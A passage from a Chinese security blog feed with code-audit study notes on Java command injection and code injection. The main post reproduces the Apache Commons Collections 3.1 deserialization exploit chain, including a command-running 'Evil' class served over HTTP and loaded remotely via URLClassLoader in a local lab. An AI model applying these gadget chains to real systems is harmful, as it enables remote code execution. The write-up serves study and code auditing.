class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">180 + EvaluationContext context &#x3D; SimpleEvaluationContext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/lup7in/article/details/8659408">https://blog.csdn.net/lup7in/article/details/8659408</a></p><p><a href="https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;表达式语言（Expression Language）简称 EL 表达式，是一种 JSP 内置的语言。&lt;/p&gt;
&lt;p&gt;在 JS</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】命令注入和代码注入</title>
    <link href="https://www.teamssix.com/211121-153433.html"/>
    <id>https://www.teamssix.com/211121-153433.html</id>
    <published>2021-11-21T07:34:33.000Z</published>
    <updated>2021-11-22T08:59:50.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-命令注入"><a href="#0x01-命令注入" class="headerlink" title="0x01 命令注入"></a>0x01 命令注入</h1><p>在开发过程中，开发人员可能需要对系统文件进行移动、删除或者执行一些系统命令，这时如果执行的命令用户可控，就会导致命令执行漏洞。</p><h2 id="1、示例"><a href="#1、示例" class="headerlink" title="1、示例"></a>1、示例</h2><p>当命令可控时，就可能会导致命令注入，例如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种漏洞原理很简单，主要就是找到执行系统命令的函数，看命令是否可控。</p><p>java 程序中执行系统命令的函数如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span>exec<span class="token class-name">Process</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">.</span>start<span class="token class-name">GroovyShell</span><span class="token punctuation">.</span>evaluate<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、命令注入的限制"><a href="#2、命令注入的限制" class="headerlink" title="2、命令注入的限制"></a>2、命令注入的限制</h2><p>对于系统命令，可以使用连接符来执行多条语句，常见连接符及含义如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span>    多个命令顺序执行，命令之间无任何逻辑关系<span class="token operator">|</span>    前面命令输出结果作为后面命令的输入内容<span class="token operator">||</span>   逻辑或，当前面命令执行失败后，后面命令才会执行，否则后面命令不执行<span class="token operator">&amp;</span>    前面命令执行后继续执行后面命令<span class="token operator">&amp;&amp;</span>   逻辑与，当前面命令执行成功后，后面命令才会执行，否则后面命令不执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 Java 环境中的命令注入，连接符的使用存在一些限制，例如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"ping "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里因为 URL 可控，因此当我们输入 127.0.0.1&amp;ipconfig 时，拼接出来的系统命令就是 ping 127.0.0.1&amp;ipconfig，该命令在系统终端下是能正常运行的，但是在 Java 环境下就会运行失败，这里因为 Java 在程序处理的过程中，会将 127.0.0.1&amp;ipconfig 当做一个完整的字符串而非两条命令，因此上面的代码不存在命令注入。</p><h1 id="0x02-代码注入"><a href="#0x02-代码注入" class="headerlink" title="0x02 代码注入"></a>0x02 代码注入</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>代码注入因为是直接注入一段代码，因此要比命令注入更加灵活，危害性也更大。</p><p>这里以 Apache Commons collections 组件为例。</p><p>Apache Commons collections 组件 3.1 版本有一段利用反射来完成特定功能的代码，控制相关参数后，就可以进行代码注入。</p><p>这里攻击者可以利用反序列化的方式控制相关参数，完成注入代码，达到执行任意代码的效果。</p><p>与命令注入相比，代码注入更具有灵活性，例如在 Apache Commons collections 反序列化漏洞中直接使用 Runtime.getRuntime().exec() 执行系统命令是无回显的，但如果通过 URLLoader 远程加载类文件以及异常处理机制就可以构造出回显的利用方式。</p><p>这里就以 Apache Commons collections 反序列化漏洞为例，体验一下代码注入，因为现阶段个人水平有限，这里还不能对 Apache Commons collections 反序列化漏洞的原理进行深入分析，等后面学习到相关内容的时候不出意外应该还会碰到这个漏洞，那个时候再好好分析分析这个漏洞。</p><h2 id="2、Apache-Commons-collections-反序列化漏洞复现"><a href="#2、Apache-Commons-collections-反序列化漏洞复现" class="headerlink" title="2、Apache Commons collections 反序列化漏洞复现"></a>2、Apache Commons collections 反序列化漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>该漏洞影响了 3.1 及以下的版本，这里以 3.1 版本为例，首先下载 commons-collections-3.1.zip 文件，下载地址：<a href="https://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.1.zip">https://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.1.zip</a></p><p>解压 commons-collections-3.1.zip 可以得到 commons-collections-3.1.jar 文件，接下来打开 intelliJ IDEA，创建一个普通的 Java 项目，然后选择「文件 –&gt; 项目结构 –&gt; 库 –&gt; + –&gt; Java」，添加 commons-collections-3.1.jar 包，我使用的 jdk 版本为 1.8.0_191</p><p>接下来在「src –&gt; com –&gt; commons」目录下创建 ApacheCommonsCollectionsDemo.java 文件（右击 com.commons 软件包选择：新建 –&gt; Java 类文件）</p><h3 id="无回显利用"><a href="#无回显利用" class="headerlink" title="无回显利用"></a>无回显利用</h3><p>在 ApacheCommonsCollectionsDemo.java 文件下写入以下代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>commons</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApacheCommonsCollectionsDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//((Runtime) Runtime.class.getMethod("getRuntime").invoke()).exec("calc")</span>        <span class="token comment">//构造恶意的chain</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token comment">//通过内置的ConstantTransformer来获取Runtime类</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token comment">//通过InvokerTransformer来反射调用getMethod方法，参数是getRuntime，其后类似</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"open -a Calculator"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//普通的Map</span>        <span class="token class-name">Map</span> mp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sw"</span><span class="token punctuation">,</span> <span class="token string">"demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 将普通的Map变成TransformedMap，并且指定变换方式为前面定义的恶意chain</span>        <span class="token class-name">Map</span> transformMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>mp<span class="token punctuation">,</span> transformChain<span class="token punctuation">,</span> transformChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改TransformedMap中的一个值，成功执行命令</span>        <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span> entry<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">)</span> transformMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意第 25 行我执行的命令是 open -a Calculator，这里是 Mac 下打开计算机的命令，如果在 Windows 下则需要修改成对应命令。</p><p>运行一下代码，可以看到成功弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111211543622.png"></p><p>这里只是实现了无回显的利用方式，接下来就利用代码注入实现有回显的利用。</p><h3 id="有回显利用"><a href="#有回显利用" class="headerlink" title="有回显利用"></a>有回显利用</h3><p>这里有回显利用的方式是使用 java.net.URLClassLoader 远程加载自定义恶意类，也就是自己放在服务器上的 jar 包，然后在抛出的异常信息中获得回显结果。</p><p>因此这里首先需要先写一个恶意类，具体如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedReader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStreamReader</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Process</span> proc <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> line<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> result <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Exception</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> e<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将恶意类打包成 jar 文件，并放到服务器上，这里因为是本地演示，就直接在本地开个 Python HTTP 服务了。</p><pre class="line-numbers language-none"><code class="language-none">javac Evil.javajar -cvf Evil.jar Evil.classpython3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 然后回到 intelliJ IDEA，在 com.commons 软件包中新建 ApacheCommonsCollectionsDemo2.java 文件，在文件中写入以下内容</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>commons</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApacheCommonsCollectionsDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getConstructor"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newInstance"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://127.0.0.1/Evil.jar"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"loadClass"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"Evil"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"Exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token 